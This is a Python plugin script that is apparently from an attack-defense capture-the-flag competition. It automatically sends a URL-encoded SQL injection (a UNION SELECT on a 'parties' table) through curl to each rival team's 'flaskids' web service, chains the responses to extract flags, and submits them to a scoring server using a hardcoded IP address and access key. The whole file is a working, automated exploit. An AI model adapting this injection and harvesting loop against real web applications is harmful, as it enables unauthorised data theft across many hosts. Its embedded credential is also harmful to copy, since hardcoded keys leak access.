# Attempts to steal flags from all teams (except the test team and
# our own!) for the 'flaskids' service
def name():
    return "steal-flask-flags"

def help():
    return "Steal flags from the 'flaskids' service!"

def args():
    return ""

def run(args):
    from re import search
    from subprocess import Popen, PIPE, STDOUT
    import swpag_client

    t = swpag_client.Team("http://34.195.187.175", "f67634a9373be60a439287965e1d8562")
    backup_flags = t.get_targets(2)

    for target in backup_flags:
        team = target['hostname']
        flag_id = target['flag_id']

        if team in ["team9", "team11", "team12"]:
            print("Skipping {0}".format(team))
            continue

        print("Trying {0} with flag_id {1}...".format(team, flag_id))

        kid_query = "Last'%20UNION%20SELECT%20invitation%20AS%20data%20FROM%20parties%20WHERE%20id%3D{0};--".format(flag_id)
        p = Popen(["curl", "-s", "{0}:10002/kid?age=8&first=First&last={1}".format(team, kid_query)], stdout=PIPE)
        out = p.stdout.readline().decode()
        m = search("Created kid (\d+)", out)

        if m == None:
            continue

        find_query = "{0}:10002/find?kid={1}".format(team, m.group(1))
        p = Popen(["curl", "-s", find_query], stdout=PIPE)
        out = p.stdout.readline().decode()
        m = search("Found kid at these parties: (\w+)", out)

        if m == None:
            continue

        info_query = "{0}:10002/info?id={1}&invitation={2}".format(team, flag_id, m.group(1))
        p = Popen(["curl", "-s", info_query], stdout=PIPE)
        out = p.stdout.readline().decode()
        m = search("Party \[(\w+)\]", out)

        if m == None:
            continue

        result = t.submit_flag([m.group(1)])

        print("Submitting flag {0} for team {1}: {2}".format(m.group(1), team, result))